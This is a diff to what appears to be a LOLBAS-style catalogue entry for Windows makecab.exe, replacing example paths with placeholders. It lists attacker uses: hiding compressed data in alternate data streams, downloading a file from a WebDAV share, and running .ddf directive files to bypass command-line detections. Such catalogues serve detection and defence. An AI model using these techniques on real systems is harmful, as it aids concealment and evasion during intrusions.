@@ -4,7 +4,7 @@ Description: Binary to package existing files into a cabinet (.cab) file
 Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab
+  - Command: makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab
     Description: Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.
     Usecase: Hide data compressed into an alternate data stream
     Category: ADS
@@ -13,7 +13,7 @@ Commands:
     OperatingSystem: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Type: Compression
-  - Command: makecab \\webdavserver\webdav\file.exe C:\Folder\file.txt:file.cab
+  - Command: makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab
     Description: Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.
     Usecase: Hide data compressed into an alternate data stream
     Category: ADS
@@ -22,7 +22,7 @@ Commands:
     OperatingSystem: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Type: Compression
-  - Command: makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab
+  - Command: makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}
     Description: Download and compresses the target file and stores it in the target file.
     Usecase: Download file and compress into a cab file
     Category: Download
@@ -31,7 +31,7 @@ Commands:
     OperatingSystem: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Type: Compression
-  - Command: makecab /F directives.ddf
+  - Command: makecab /F {PATH:.ddf}
     Description: Execute makecab commands as defined in the specified Diamond Definition File (.ddf); see resources for the format specification.
     Usecase: Bypass command-line based detections
     Category: Execute
